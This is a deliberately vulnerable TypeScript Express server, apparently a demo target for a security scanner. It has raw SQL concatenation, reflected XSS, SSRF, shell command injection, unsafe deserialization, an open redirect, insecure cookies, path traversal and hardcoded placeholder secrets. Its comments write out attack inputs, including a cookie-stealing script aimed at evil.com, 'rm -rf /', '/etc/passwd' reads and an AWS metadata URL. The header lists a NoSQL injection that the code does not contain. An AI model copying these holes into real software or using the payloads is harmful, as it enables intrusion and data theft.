/**
 * DEMO FILE — intentional vulnerabilities for security scanner showcase.
 *
 * CWE findings  : CWE-89  (SQL Injection — user input in raw query),
 *                 CWE-79  (XSS — user input in HTML response),
 *                 CWE-918 (SSRF — user-controlled outbound URL),
 *                 CWE-78  (Command Injection — user input in shell exec),
 *                 CWE-502 (Deserialization — node-serialize with user data),
 *                 CWE-601 (Open Redirect — user-controlled redirect),
 *                 CWE-614 (Insecure Cookie — no Secure/HttpOnly flags),
 *                 CWE-943 (NoSQL Injection — user input in MongoDB query)
 * Secrets       : DB connection string, OpenAI key, Anthropic key hardcoded
 */

import express, { Request, Response } from 'express';
import { exec } from 'child_process';
import * as http from 'http';
import * as https from 'https';
import * as fs from 'fs';
import * as path from 'path';
import * as serialize from 'node-serialize';

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CWE-798: hardcoded production secrets
const DB_URL        = 'postgresql://admin:Pr0dDB@dmin2024!@prod-db.example.com:5432/app';
const OPENAI_KEY    = 'sk-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456';
const ANTHROPIC_KEY = 'sk-ant-api03-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP-QRSTUVWXYZ0';
const AWS_SECRET    = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';

// CWE-89: SQL Injection — user input concatenated into raw SQL
app.get('/api/users', async (req: Request, res: Response) => {
    const { pg } = await import('pg');
    const client = new pg.Client({ connectionString: DB_URL });
    await client.connect();

    const search = req.query.search as string;
    const role   = req.query.role   as string;
    // Attacker sends ?search=' OR 1=1-- to dump all users
    const result = await client.query(
        `SELECT * FROM users WHERE name LIKE '%${search}%' AND role = '${role}'`
    );
    res.json(result.rows);
});

app.post('/api/orders', async (req: Request, res: Response) => {
    const { pg } = await import('pg');
    const client = new pg.Client({ connectionString: DB_URL });
    await client.connect();
    const { userId, status } = req.body;
    // CWE-89: no parameterization
    await client.query(
        `UPDATE orders SET status='${status}' WHERE user_id=${userId}`
    );
    res.json({ updated: true });
});

// CWE-79: XSS — user input reflected into HTML response without encoding
app.get('/search', (req: Request, res: Response) => {
    const query = req.query.q as string;
    // Attacker sends ?q=<script>document.location='https://evil.com?c='+document.cookie</script>
    res.send(`
        <html><body>
          <h1>Search Results for: ${query}</h1>
          <p>You searched for: ${query}</p>
        </body></html>
    `);
});

app.get('/profile', (req: Request, res: Response) => {
    const name = req.query.name as string;
    const bio  = req.headers['x-user-bio'] as string;
    res.send(`<div class="profile"><h2>${name}</h2><p>${bio}</p></div>`);
});

// CWE-918: SSRF — user-controlled outbound HTTP request
app.get('/api/fetch', (req: Request, res: Response) => {
    const url = req.query.url as string;
    // Attacker sends ?url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
    https.get(url, (proxyRes) => {
        let data = '';
        proxyRes.on('data', (chunk: string) => data += chunk);
        proxyRes.on('end', () => res.send(data));
    }).on('error', () => res.status(500).send('Error'));
});

app.post('/api/webhook/test', (req: Request, res: Response) => {
    const endpoint = req.body.endpoint as string;
    http.get(endpoint, (r) => {
        res.json({ status: r.statusCode });
    });
});

// CWE-78: Command Injection — user input in shell exec
app.post('/api/tools/ping', (req: Request, res: Response) => {
    const host = req.body.host as string;
    // Attacker sends host=; rm -rf / or host=$(cat /etc/passwd)
    exec(`ping -c 3 ${host}`, (err, stdout) => {
        res.json({ output: stdout, error: err?.message });
    });
});

app.get('/api/tools/whois', (req: Request, res: Response) => {
    const domain = req.query.domain as string;
    exec(`whois ${domain}`, (err, stdout) => {
        res.send(stdout);
    });
});

// CWE-502: Deserialization — node-serialize with untrusted data
app.post('/api/session/restore', (req: Request, res: Response) => {
    const payload = req.body.data as string;
    // node-serialize executes IIFEs in deserialized objects — arbitrary code exec
    const obj = serialize.unserialize(payload);
    res.json({ session: obj });
});

// CWE-601: Open Redirect — user controls Location header
app.get('/auth/callback', (req: Request, res: Response) => {
    const next = req.query.next as string;
    res.redirect(next);  // CWE-601: unvalidated redirect target
});

// CWE-614: Insecure Cookie — no Secure or HttpOnly
app.post('/auth/login', (req: Request, res: Response) => {
    const { username } = req.body;
    res.cookie('auth', username, { maxAge: 86400000 }); // Missing secure/httpOnly
    res.cookie('role', 'user', { path: '/' });
    res.json({ loggedIn: true });
});

// CWE-22: Path Traversal in TypeScript server
app.get('/files/:name', (req: Request, res: Response) => {
    const filename = req.params.name;
    const filePath = path.join('/var/app/uploads', filename);
    res.sendFile(filePath);  // CWE-22: no canonicalization check
});

app.listen(3000);
export default app;
